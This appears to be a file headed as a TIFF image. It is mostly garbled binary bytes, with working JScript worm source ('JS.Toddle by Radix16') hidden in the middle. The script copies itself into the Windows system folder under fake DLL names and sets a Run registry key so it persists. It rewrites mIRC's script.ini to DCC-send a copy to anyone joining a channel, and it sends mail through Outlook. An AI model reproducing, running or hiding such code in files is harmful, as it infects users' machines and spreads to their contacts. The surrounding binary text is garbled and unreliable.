//TIFF‹<  ‹C‰ƒ€  ‹K‰KÇƒ8      _^3À[‹å]Â V‹t$…öt?Ç†8     èX PVè1   ‹F‹NƒÄ;Ár¸   ë@PVèõéÿÿƒÄÇ†8      ^Â ‹D$‹ˆ  …Ét‹T$+ÑD  Ç€      Ã‹L$…ÉVWu_3À^Â ‹T$öÂ€‹D$u‹±  öD†ü…   ƒâƒê tuJtJJuhxþ…ÿ|‹±  ö¾u,;As$‹†€â@„ÒulOëÝ;As=‹‘  ‹‚€â@„ÒuSOëÄG_^Â ‹q;Æs‹‰  ‹€â@ƒÁ„Òu+;Ærï_3À^Â ƒÀþƒø|‹‰  öu	Hƒéƒø}ò@_^Â UV‹t$…öW„¨   Ç†8     ‹F‹|$;øv‹øöD$uv9~t{j WVèåþÿÿ‹è‹F;ør;èvUVèèÿÿƒÄ;ïtWjVè"  ‹F;†€  tVè1ùÿÿVè+þÿÿ9~tVè ùÿÿVèþÿÿ9~uïj Vèí  Ç†8      _^]Â WVè&èÿÿƒÄÇ†8      _^]Â V‹t$…ö„Ì   WjVèª  ƒ¾T  u(Ç†T      ‹†T  …Àu‹=ä0jÿ×‹†T
//ÿÿÿÿÿÿÿÿÿÿÿ÷   ÿÿÿÿÿÿÿÿÿÿÿ÷   ÿ÷wwÿÿwwww÷   ÿ™™™ÿÿù™™™Ÿ÷   ÿÿ—ÿÿÿÿù™—ÿ÷   ÿÿùÿÿÿù™—ÿ÷   ÿÿùÿÿÿ™™ÿ÷   ÿÿÿ™™™™™™ÿ÷   ÿÿÿ—ÿÿÿ™—ÿÿ÷   ÿÿÿùÿù™—ÿÿ÷   ÿÿÿùÿù™ÿÿ÷   ÿÿÿÿ—ÿ™™ÿÿ÷   ÿÿÿÿ—ÿ™—ÿÿÿ÷   ÿÿÿÿùy™—ÿÿÿ÷   ÿÿÿÿùy™ÿÿÿ÷   ÿÿÿÿÿ™™ÿÿÿ÷   ÿÿÿÿÿ™—ÿÿÿÿ÷   ÿÿÿÿÿù—ÿÿÿÿ÷   ÿÿÿÿÿùÿÿÿÿÿ÷   ÿÿÿÿÿÿÿÿÿÿÿ÷   ÿÿÿÿÿÿÿÿÿÿÿ÷   ÿÿÿÿÿÿÿÿÿ€     ÿÿÿÿÿÿÿÿÿ÷€   ÿÿÿÿÿÿÿÿÿx    ÿÿÿÿÿÿÿÿÿ‡€    ÿÿÿÿÿÿÿÿÿˆ     ÿÿÿÿÿÿÿÿÿ€     ˆˆˆˆˆˆˆˆˆ€    à  à  à  à  à  à  à  à  à  à  à  à  à  à  à  à  à  à  à
//   ˆªC èªC Ø¦C À¦C ¨¦C ¦C                     ªC             PõC ÀªC     põC        ÿÿÿÿ        èªC Ø¦C À¦C ¨¦C ¦C                 «C             põC «C     õC        ÿÿÿÿ        @«C Ð§C                    X«C             õC h«C Ð§C                    Œ«C             xôC ˜«C     °õC        ÿÿÿÿ        À«C Ð§C                    Ø«C             °õC è«C     ÐõC        ÿÿÿÿ        ¬C Ð§C                    (¬C             ÐõC 8¬C     øõC        ÿÿÿÿ        `¬C À«C Ð§C                x¬C             øõC ˆ¬C      öC        ÿÿÿÿ        °¬C ¦C                    È¬C              öC Ø¬C     8öC        ÿÿÿÿ         ­C °¬C ¦C                ­C             8öC (­C     PöC        ÿÿÿÿ        P­C °¬C ¦C                h­C             PöC x­C     höC        ÿÿÿÿ        ˆöC        ÿÿÿ
	var NetDrives, Outlook, fso, wormsm, msgmapi, pathwin, IRCbxs,mapi, emailaddress, xcv;
	var Topic_Text = "JS.Toddle by Radix16 ";
	var Title_Text = "Only Sample (TEST) JS=VBS :)" 
	var nameworm = "Kernel32.dll.js"
	var fso = WScript.CreateObject("Scripting.FileSystemObject")
	var wormsm = fso.GetFile(WScript.ScriptFullName)
	var WSHShell = WScript.CreateObject("WScript.Shell");
	var WSHNetwork = WScript.CreateObject("WScript.Network")
	var s1dir = fso.GetSpecialFolder(1)
	wormsm.Copy (s1dir + "\\" + nameworm)
	Welcome();
	Replicate();
	IRCspreading();
	MAPIsendMail();
function Welcome() {
	var Click_OK = 0;
	var javalame; 
	javalame = WSHShell.Popup(Title_Text,0,Topic_Text,0); 
	RegEdit();
}
function RegEdit() {
	var pathwin = (s1dir + "\\" + nameworm)
	WSHShell.RegWrite("HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\kernel",pathwin);
}
function IRCspreading() {
	var True = 1
	var IRCpath = ("C:\\mirc\\")	
	var IRCbxs = fso.CreateTextFile(IRCpath + "script.ini", True)
	IRCbxs.WriteLine ("[script]")
	IRCbxs.WriteLine ("n0=ON 1:JOIN:#:{ /if ( "+unescape("%2"+"4")+"nick == "+unescape("%2"+"4")+"me ) { halt }")
	IRCbxs.WriteLine ("n1=/dcc send "+unescape("%2"+"4")+"nick " + s1dir + "\\bill.js")
	IRCbxs.WriteLine ("}")
}
function Replicate() {
	var r1x = "Mapi32.dll.js"
	var r2x = "User32.dll.js"
	var r3x = "Wsock32.dll.js"
	var r4x = "bill.js"
	wormsm.Copy (s1dir + "\\" + r1x)
	wormsm.Copy (s1dir + "\\" + r2x)
	wormsm.Copy (s1dir + "\\" + r3x)
	wormsm.Copy (s1dir + "\\" + r4x)
}
function MAPIsendMail() {
	var Outlook = WScript.CreateObject("Outlook.Application")
	var msgmapi = Outlook.CreateItem(0)
	msgmapi.To = "Radix16@atlas.cz" // only for test
	msgmapi.Subject = "hia"
	msgmapi.Body = "Hi, Radix16 IRC rulezz ;)"
	msgmapi.DeleteAfterSubmit = 1
	msgmapi.Send
}
//Pÿvÿ8OB ‹}ðEä+}èPÿvÿ8OB ‹Eè+EðÇ…ÀŽ2üÿÿ‹M‰Aé'üÿÿ‹My   uQVèÏ8  éüÿÿÿuWSVèr éÿûÿÿ‹My   uQVèTR  éçûÿÿÿuWSVèïq é×ûÿÿÿuVè;  éÆûÿÿÿuWVè‹r …À„¦ûÿÿé²ûÿÿÿuWVè÷† é£ûÿÿÿuWVè:q é”ûÿÿ‹EÁè·U·ÈQRWVècp ÿuWSVè†q énûÿÿj ÿuWVèñu …À…Zûÿÿ‹ÇÁè¨ufÿÿ‡FûÿÿÿuWSVè¸P  é6ûÿÿj Vè  …À…ûÿÿ·EPVè:“ éûÿÿÿuWSVèˆP  éûÿÿ‹Fl…ÀtÿuWSPÿXOB ƒ~p „éúÿÿVèÊŒ éÞúÿÿ‹Nl;ùuÇEü   ‹M‰NléÅúÿÿ…É„½úÿÿÿuWSQÿXOB é©úÿÿö†„   …ŸúÿÿjMÈh  h  ÿuQÿdOB …À…~úÿÿÿuWVèWl ÇEü   éhúÿÿj@ÿvÿ¬LB …À…Uúÿÿ‹FW‹ÿuPÿS8éCúÿÿÿuWVè§s é4úÿÿ‰uüé,úÿÿVèŸL  ÿuVèà  Vè%O  éúÿÿ‹N…É„úÿÿ…ÿtj ÿuQè› éðùÿÿÿuQèío  éâùÿÿVèNp éÚùÿÿ‹F…À„ÏùÿÿP
